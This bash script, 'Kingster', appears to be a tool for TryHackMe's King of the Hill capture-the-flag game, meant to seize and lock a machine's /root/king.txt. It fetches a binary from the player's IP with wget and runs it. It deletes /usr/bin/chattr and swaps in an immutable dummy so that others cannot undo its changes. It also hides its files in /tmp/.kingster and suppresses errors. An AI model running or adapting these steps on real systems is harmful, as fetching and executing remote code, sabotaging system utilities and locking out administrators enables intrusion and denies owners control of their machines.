#!/bin/bash

#############################################################
# Kingster script to protect king.txt in thm's koth         #
#                                                           #
# Site: https://github.com/CeloXSec/Kingster                #
# Author: CeloXSec <celoxsec@gmail.com>                     #
#############################################################
# This program takes the nickname and IP of the player as   #
# parameters and downloads the chattr binary to set         #
# and protect king.txt                                      #
#                                                           #
# Examples:                                                 #
# root@10-10-0-1:~# python3 -m http.server 80               #
# root@target:~# wget 10.10.0.1/kingster.sh                 #
# root@target:~# chmod +x kingster.sh                       #
# root@target:~# bash kingster.sh CeloXSec 10.10.0.1        #
#                                                           #
# Resetting attributes of /root/king.txt and removing it.   #
#                                                           #
# cur attrs: 0x00000000, mask: 0x00088030                   #
# new attrs: 0x00000000                                     #
#                                                           #
# Setting CeloXSec as the King                              #
#                                                           #
# Setting attributes of /root/king.txt                      #
#                                                           #
# cur attrs: 0x00000000, mask: 0x00000010                   #
# new attrs: 0x00000010                                     #
#                                                           #
# [+] Congrats CeloXSec, You are the new King of the game!  #
#                                                           #
# Version 1.0                                               #
# 09/03/23                                                  #
# Version 1.1 - (More filtered and pretty output)           #
# 09/05/23                                                  #
# Version 1.2 - (Removed ln - Compatibility)                #
# 09/12/23                                                  #
# Version 2.0 - (Moved to /tmp/.kingster, Translated to EN) #
# 09/18/23                                                  #
#############################################################

#define colors
white='\033[1;37m'
green='\033[0;32m'
red='\033[0;31m'
blue='\033[38;5;123m'

printf "${red}    _  ___                 _ \n"
printf "   | |/ (_)_ __   __ _ ___| |_ ___ _ __ \n"
printf "   | ' /| | '_ \ / _' / __| __/ _ \ '__| \n"
printf "   | . \| | | | | (_| \__ \ ||  __/ | \n  "
printf " |_|\_\_|_| |_|\__, |___/\__\___|_| \n  "
printf "                |___/ \n        "
printf "${blue}      [ https://github.com/CeloXSec/Kingster ] \n\n"

if [ "$1" == "" ] || [ "$2" == "" ];
    then
         printf "${blue}Usage: ${green} bash kingster.sh nickname vpnip \n"
         exit 1
    else
         # $king_file defines the path to the king.txt file
         king_file="/root/king.txt"

         # Download the chattr binary and grant execution permission
         printf "${white} [${red}+${white}]${green} Downloading Dependencies.\n\n"
         wget -q $2/changeattr
         sleep 1
         chmod +x changeattr

         # Create /tmp/.kingster and move the chattr binary to /tmp/.kingster
         mkdir /tmp/.kingster
         mv changeattr /tmp/.kingster
         cd /tmp/.kingster

         # Remove the existing chattr and create a fake one
         rm -rf /usr/bin/chattr 2>/dev/null
         touch /usr/bin/chattr 2>/dev/null
         chmod a-rwx /usr/bin/chattr 2>/dev/null
         ./changeattr +i /usr/bin/chattr >/dev/null 2>/dev/null

         # Dominate king.txt
         printf "${white} [${red}+${white}]${green} Resetting attributes of${white} $king_file ${green}and removing it. ${blue} \n\n"
         ./changeattr -iaet $king_file 2>/dev/null
         rm -rf $king_file 2>/dev/null
         printf "\n${white} [${red}+${white}]${green} Setting ${white}$1 ${green}as King ${blue}\n\n"
         echo $1 > $king_file 2>/dev/null
         printf "${white} [${red}+${white}]${green} Setting attributes of${white} $king_file ${green}(protecting king.txt) ${blue}\n\n"
         ./changeattr +i $king_file  2>/dev/null

         # Check if there were any errors in the previous commands
         if [ "$?" -eq 0 ]; then
             # Display the success message
             printf "\n${white} [${red}+${white}]${green} Congratulations ${white}$1 ${green}, You are the new King of the game! \n"
         else
             printf "\n${red}An error occurred while protecting king.txt. \n"
         fi
fi
